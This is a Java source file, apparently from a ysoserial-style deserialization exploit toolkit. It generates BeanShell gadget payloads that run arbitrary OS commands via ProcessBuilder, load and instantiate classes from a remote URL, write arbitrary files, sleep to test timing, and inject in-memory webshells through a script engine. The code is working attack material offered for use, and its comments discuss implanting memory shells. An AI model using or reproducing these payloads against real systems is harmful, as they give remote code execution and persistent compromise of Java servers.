package org.su18.ysuserial.payloads.util;

import org.su18.ysuserial.Strings;

import java.util.Arrays;

import static org.su18.ysuserial.payloads.handle.GlassHandler.generateClass;
import static org.su18.ysuserial.payloads.util.Utils.*;

/**
 * @author su18
 */
public class BeanShellUtil {

	public static String makeBeanShellPayload(String command) throws Exception {
		if (command.startsWith("TS-"))
			return "compare(Object su18, Object su19) { return new Integer(1);}java.lang.Thread.sleep(" + (Integer.parseInt(command.split("[-]")[1]) * 1000) + "L);";
		if (command.startsWith("RC-")) {
			String[] strings = handlerCommand(command);
			return "compare(Object su18, Object su19) { return new Integer(1);}new URLClassLoader(new URL[]{new URL(\"" + strings[0] + "\")}).loadClass(\"" + strings[1] + "\").newInstance();";
		}
		if (command.startsWith("WF-")) {
			String[] strings = handlerCommand(command);
			return "compare(Object su18, Object su19) { return new Integer(1);}new java.io.FileOutputStream(\"" + strings[0] + "\").write(\"" + strings[1] + "\".getBytes());";
		}

		// 回显及内存马
		if (command.startsWith("EX-") || command.startsWith("LF-")) {
			// 虽然 Bsh 支持全部 Java 语法及很多松散写法，但是说到底还是脚本语言的解析，在此例中，如果使用了这些写法，或脚本中使用了数组等
			// 在反序列化过程中会调用相关实现类的相关方法，可能用到 Interpreter 对象，报空指针
			// 因此这里还是使用 ScriptEngineManager 一行就能写下的形式支持内存马，无需各种复杂写法
			// 实战可用性有待测试
			return "compare(Object su18, Object su19) {new javax.script.ScriptEngineManager().getEngineByName(\"JavaScript\").eval(\"" + getJSEngineValue(generateClass(command).toBytecode()).replace("\"", "\\\"") + "\");return new Integer(1);}";
		}

		return "compare(Object su18, Object su19) {new java.lang.ProcessBuilder(new String[]{" +
				Strings.join(
						Arrays.asList(command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"").split(" ")), ",", "\"", "\"") + "}).start();return new Integer(1);}";
	}

}
